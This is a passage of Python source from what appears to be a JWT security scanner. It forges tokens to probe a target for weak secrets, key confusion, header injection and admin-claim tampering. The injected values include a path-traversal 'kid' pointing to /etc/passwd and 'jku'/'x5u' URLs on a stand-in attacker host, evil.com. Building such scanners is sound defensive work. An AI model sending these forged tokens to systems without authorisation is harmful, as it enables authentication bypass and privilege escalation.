                                vuln_id=f"jwt-weak-secret-{uuid.uuid4().hex[:8]}",
                                name="JWT Weak Secret Key",
                                description=f"JWT token uses weak secret key: '{secret}'. Found in {location}",
                                risk="Critical",
                                cvss_score=9.1,
                                solution="Use cryptographically strong, randomly generated secret keys",
                                references=[
                                    "https://tools.ietf.org/html/rfc7518",
                                    "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/"
                                ],
                                cwe_id="CWE-327",
                                wasc_id="WASC-15",
                                url=url,
                                parameter=location,
                                evidence=f"Weak secret: {secret}",
                                scan_id="jwt-scan",
                                request=format_http_request(method, url, test_headers, ""),
                                response=format_http_response(test_response.status_code, dict(test_response.headers), test_response.text)
                            )
                            vulnerabilities.append(vuln)
                            break  # Found a weak secret, no need to test more
                    
                    except Exception as e:
                        self.logger.debug(f"Brute force test failed for secret '{secret}': {e}")
                        continue
        
        except Exception as e:
            self.logger.debug(f"Brute force attack test failed: {e}")
        
        return vulnerabilities
    
    def _test_key_confusion_attacks(self, token: str, url: str, method: str, 
                                   headers: Dict[str, str], location: str) -> List[Vulnerability]:
        """Test for key confusion vulnerabilities."""
        vulnerabilities = []
        
        try:
            header, payload, signature = token.split('.')
            header_data = self._decode_jwt_part(header)
            
            if header_data and header_data.get('alg', '').upper() == 'RS256':
                # Test key confusion: try to use public key as HMAC secret
                # This is a common mistake where developers use the public key as HMAC secret
                
                # Generate a fake public key (simplified test)
                fake_public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...\n-----END PUBLIC KEY-----"
                
                # Create HMAC signature with fake public key
                message = f"{header}.{payload}"
                fake_sig = base64.urlsafe_b64encode(
                    hmac.new(fake_public_key.encode(), message.encode(), hashlib.sha256).digest()
                ).decode().rstrip('=')
                
                # Create malicious token with HS256 algorithm
                malicious_header = self._encode_jwt_part({'alg': 'HS256', 'typ': 'JWT'})
                malicious_token = f"{malicious_header}.{payload}.{fake_sig}"
                
                # Test the malicious token
                test_headers = headers.copy()
                test_headers['Authorization'] = f"Bearer {malicious_token}"
                
                test_response = self.make_request(url, method, test_headers, "")
                
                if test_response and test_response.status_code == 200:
                    vuln = self.create_vulnerability(
                        vuln_id=f"jwt-key-confusion-{uuid.uuid4().hex[:8]}",
                        name="JWT Key Confusion Vulnerability",
                        description=f"Server vulnerable to key confusion attack. Found in {location}",
                        risk="Critical",
                        cvss_score=9.8,
                        solution="Always use different keys for signing and verification, and validate algorithm",
                        references=[
                            "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/",
                            "https://tools.ietf.org/html/rfc7519"
                        ],
                        cwe_id="CWE-327",
                        wasc_id="WASC-15",
                        url=url,
                        parameter=location,
                        evidence="Key confusion attack successful",
                        scan_id="jwt-scan",
                        request=format_http_request(method, url, test_headers, ""),
                        response=format_http_response(test_response.status_code, dict(test_response.headers), test_response.text)
                    )
                    vulnerabilities.append(vuln)
        
        except Exception as e:
            self.logger.debug(f"Key confusion test failed: {e}")
        
        return vulnerabilities
    
    def _test_header_injection_attacks(self, token: str, url: str, method: str, 
                                     headers: Dict[str, str], location: str) -> List[Vulnerability]:
        """Test for header injection vulnerabilities."""
        vulnerabilities = []
        
        try:
            header, payload, signature = token.split('.')
            header_data = self._decode_jwt_part(header)
            
            # Test for header injection with malicious claims
            malicious_claims = {
                'kid': '../../../etc/passwd',
                'jku': 'https://evil.com/jwks.json',
                'x5u': 'https://evil.com/cert.pem',
                'x5c': 'malicious-certificate'
            }
            
            for claim, value in malicious_claims.items():
                # Create malicious header
                malicious_header_data = header_data.copy()
                malicious_header_data[claim] = value
                malicious_header = self._encode_jwt_part(malicious_header_data)
                
                # Create malicious token (keep original signature for now)
                malicious_token = f"{malicious_header}.{payload}.{signature}"
                
                # Test the malicious token
                test_headers = headers.copy()
                test_headers['Authorization'] = f"Bearer {malicious_token}"
                
                test_response = self.make_request(url, method, test_headers, "")
                
                # Check if server processes the malicious header
                if test_response and test_response.status_code == 200:
                    vuln = self.create_vulnerability(
                        vuln_id=f"jwt-header-injection-{claim}-{uuid.uuid4().hex[:8]}",
                        name=f"JWT Header Injection - {claim.upper()}",
                        description=f"JWT header contains potentially malicious {claim} claim. Found in {location}",
                        risk="High",
                        cvss_score=8.1,
                        solution="Validate and sanitize all JWT header claims, especially kid, jku, x5u, x5c",
                        references=[
                            "https://tools.ietf.org/html/rfc7519",
                            "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/"
                        ],
                        cwe_id="CWE-345",
                        wasc_id="WASC-15",
                        url=url,
                        parameter=location,
                        evidence=f"Malicious {claim}: {value}",
                        scan_id="jwt-scan",
                        request=format_http_request(method, url, test_headers, ""),
                        response=format_http_response(test_response.status_code, dict(test_response.headers), test_response.text)
                    )
                    vulnerabilities.append(vuln)
        
        except Exception as e:
            self.logger.debug(f"Header injection test failed: {e}")
        
        return vulnerabilities
    
    def _test_claim_manipulation_attacks(self, token: str, url: str, method: str, 
                                       headers: Dict[str, str], location: str) -> List[Vulnerability]:
        """Test for claim manipulation vulnerabilities."""
        vulnerabilities = []
        
        try:
            header, payload, signature = token.split('.')
            payload_data = self._decode_jwt_part(payload)
            
            if not payload_data:
                return vulnerabilities
            
            # Test for privilege escalation through claim manipulation
            malicious_claims = {
                'role': 'admin',
                'admin': True,
                'is_admin': True,
                'permissions': ['admin', 'root', 'superuser'],
                'groups': ['admin', 'root'],
                'authorities': ['ROLE_ADMIN', 'ROLE_ROOT']
            }
            
            for claim, value in malicious_claims.items():
                # Create malicious payload
                malicious_payload_data = payload_data.copy()
                malicious_payload_data[claim] = value
                malicious_payload = self._encode_jwt_part(malicious_payload_data)
                
                # Create malicious token (keep original signature for now)
                malicious_token = f"{header}.{malicious_payload}.{signature}"
                
                # Test the malicious token
                test_headers = headers.copy()
                test_headers['Authorization'] = f"Bearer {malicious_token}"
                
                test_response = self.make_request(url, method, test_headers, "")
                
                # Check if server accepts the malicious claim
                if test_response and test_response.status_code == 200:
                    vuln = self.create_vulnerability(
                        vuln_id=f"jwt-claim-manipulation-{claim}-{uuid.uuid4().hex[:8]}",
                        name=f"JWT Claim Manipulation - {claim.upper()}",
                        description=f"JWT token accepts manipulated {claim} claim, potentially allowing privilege escalation. Found in {location}",
                        risk="High",
                        cvss_score=8.8,
                        solution="Always validate and verify JWT claims on the server side, do not trust client-provided claims",
                        references=[
                            "https://tools.ietf.org/html/rfc7519",
                            "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/"
                        ],
                        cwe_id="CWE-345",
                        wasc_id="WASC-15",
                        url=url,
                        parameter=location,
                        evidence=f"Manipulated {claim}: {value}",
                        scan_id="jwt-scan",
                        request=format_http_request(method, url, test_headers, ""),
                        response=format_http_response(test_response.status_code, dict(test_response.headers), test_response.text)
                    )
                    vulnerabilities.append(vuln)
        
        except Exception as e:
            self.logger.debug(f"Claim manipulation test failed: {e}")
        
        return vulnerabilities
    
    def _check_jwt_key_management(self, request: Dict[str, Any], response: Any, 
                                 url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
        """Check for JWT key management vulnerabilities."""
        vulnerabilities = []
        
        # Check for exposed JWT keys in responses
        if response and hasattr(response, 'text'):
            response_text = response.text.lower()
            
            # Check for exposed keys
            key_patterns = [
                r'-----BEGIN (RSA )?PRIVATE KEY-----',
                r'-----BEGIN PUBLIC KEY-----',
                r'"secret":\s*"[^"]+"',
                r'"key":\s*"[^"]+"',
                r'"jwt_secret":\s*"[^"]+"'
            ]
            
            for pattern in key_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    vuln = self.create_vulnerability(
                        vuln_id=f"jwt-exposed-key-{uuid.uuid4().hex[:8]}",
                        name="JWT Key Exposed in Response",
                        description="JWT signing key or secret is exposed in the response",
                        risk="Critical",
                        cvss_score=9.8,
                        solution="Never expose JWT signing keys in API responses or client-side code",
                        references=[
                            "https://tools.ietf.org/html/rfc7518",
                            "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/"
                        ],
                        cwe_id="CWE-200",
                        wasc_id="WASC-15",
                        url=url,
                        parameter="Response",
                        evidence="Exposed key pattern detected",
                        scan_id="jwt-scan",
                        request=format_http_request(method, url, headers, ""),
                        response=format_http_response(response.status_code, response.headers, response.text)
                    )
                    vulnerabilities.append(vuln)
                    break
        
        return vulnerabilities
    
    def _check_jwt_timing_attacks(self, request: Dict[str, Any], response: Any, 
                                 url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
        """Check for JWT timing attack vulnerabilities."""
        vulnerabilities = []
        
        # This is a simplified timing attack test
        # In a real implementation, you would measure response times more precisely
        
        tokens = self._extract_jwt_tokens(request, response)
        if not tokens:
            return vulnerabilities
        
        # Test with valid and invalid tokens to check for timing differences
        valid_token = tokens[0]['token']
        
        # Create invalid token
        header, payload, signature = valid_token.split('.')
        invalid_token = f"{header}.{payload}.invalid_signature"
        
        # Test response times (simplified)
        start_time = time.time()
        test_headers = headers.copy()
        test_headers['Authorization'] = f"Bearer {valid_token}"
        valid_response = self.make_request(url, method, test_headers, "")
        valid_time = time.time() - start_time
        
        start_time = time.time()
        test_headers['Authorization'] = f"Bearer {invalid_token}"
        invalid_response = self.make_request(url, method, test_headers, "")
        invalid_time = time.time() - start_time
        
        # Check for significant timing differences
        if abs(valid_time - invalid_time) > 0.1:  # 100ms difference
            vuln = self.create_vulnerability(
                vuln_id=f"jwt-timing-attack-{uuid.uuid4().hex[:8]}",
                name="JWT Timing Attack Vulnerability",
                description="JWT validation shows timing differences between valid and invalid tokens",
                risk="Medium",
                cvss_score=5.3,
                solution="Use constant-time comparison for JWT signature validation",
                references=[
                    "https://tools.ietf.org/html/rfc7519",
                    "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/"
                ],
                cwe_id="CWE-208",
                wasc_id="WASC-15",
                url=url,
                parameter="JWT Validation",
                evidence=f"Timing difference: {abs(valid_time - invalid_time):.3f}s",
                scan_id="jwt-scan",
                request=format_http_request(method, url, headers, ""),
                response=format_http_response(response.status_code, response.headers, response.text) if response else ""
            )
            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _check_jwt_replay_attacks(self, request: Dict[str, Any], response: Any, 
                                 url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
        """Check for JWT replay attack vulnerabilities."""
        vulnerabilities = []
        
        tokens = self._extract_jwt_tokens(request, response)
        if not tokens:
            return vulnerabilities
        
        token = tokens[0]['token']
        
        try:
            header, payload, signature = token.split('.')
            payload_data = self._decode_jwt_part(payload)
            
            # Check for missing jti (JWT ID) claim
            if 'jti' not in payload_data:
                vuln = self.create_vulnerability(
                    vuln_id=f"jwt-missing-jti-{uuid.uuid4().hex[:8]}",
                    name="JWT Missing JTI Claim",
                    description="JWT token missing 'jti' (JWT ID) claim, vulnerable to replay attacks",
                    risk="Medium",
                    cvss_score=6.5,
                    solution="Include unique 'jti' claim in JWT tokens and implement token blacklisting",
                    references=["https://tools.ietf.org/html/rfc7519"],
                    cwe_id="CWE-345",
                    wasc_id="WASC-15",
                    url=url,
                    parameter="JWT Claims",
                    evidence="Missing jti claim",
                    scan_id="jwt-scan",
                    request=format_http_request(method, url, headers, ""),
                    response=format_http_response(response.status_code, response.headers, response.text) if response else ""
                )
                vulnerabilities.append(vuln)
            
            # Test replay attack by reusing the same token
            test_headers = headers.copy()
            test_headers['Authorization'] = f"Bearer {token}"
            
            # Make multiple requests with the same token
            responses = []
            for i in range(3):
                test_response = self.make_request(url, method, test_headers, "")
                responses.append(test_response)
                time.sleep(0.1)  # Small delay
            
            # Check if all requests succeed (indicating no replay protection)
            if all(r and r.status_code == 200 for r in responses):
                vuln = self.create_vulnerability(
                    vuln_id=f"jwt-replay-attack-{uuid.uuid4().hex[:8]}",
                    name="JWT Replay Attack Vulnerability",
                    description="JWT token can be reused multiple times, indicating no replay protection",
                    risk="Medium",
                    cvss_score=6.5,
                    solution="Implement token blacklisting, one-time use tokens, or short expiration times",
                    references=["https://tools.ietf.org/html/rfc7519"],
                    cwe_id="CWE-345",
                    wasc_id="WASC-15",
                    url=url,
                    parameter="JWT Replay",
                    evidence="Token reused successfully multiple times",
                    scan_id="jwt-scan",
                    request=format_http_request(method, url, headers, ""),
                    response=format_http_response(response.status_code, response.headers, response.text) if response else ""
                )
                vulnerabilities.append(vuln)
        
        except Exception as e:
            self.logger.debug(f"Replay attack test failed: {e}")
        
        return vulnerabilities
    
    def _encode_jwt_part(self, data: Dict[str, Any]) -> str:
        """Encode JWT part (header or payload)."""
        json_str = json.dumps(data, separators=(',', ':'))
        encoded = base64.urlsafe_b64encode(json_str.encode('utf-8')).decode('utf-8')
        return encoded.rstrip('=')
    
    def _decode_jwt_part(self, part: str) -> Dict[str, Any]:
        """Decode a JWT part (header or payload)."""
        try:
            # Add padding if needed
            missing_padding = len(part) % 4
            if missing_padding:
                part += '=' * (4 - missing_padding)
            
            decoded = base64.urlsafe_b64decode(part)
            return json.loads(decoded.decode('utf-8'))
        except Exception:
            return {}
    
    def generate_poc(self, vulnerability_id: str) -> ProofOfConcept:
        """Generate proof-of-concept for JWT vulnerabilities."""
        # This would generate specific PoCs based on the vulnerability type
        # For now, return a generic PoC
        return ProofOfConcept(
            vulnerability_id=vulnerability_id,
            request_method="GET",
            request_url="https://example.com/api/protected",
            request_headers={"Authorization": "Bearer <JWT_TOKEN>"},
            request_body="",
            response_status=200,
            response_headers={"Content-Type": "application/json"},
            response_body='{"message": "JWT vulnerability detected"}',
            timestamp=datetime.now(),
            evidence_description="JWT token contains security vulnerability"
        )
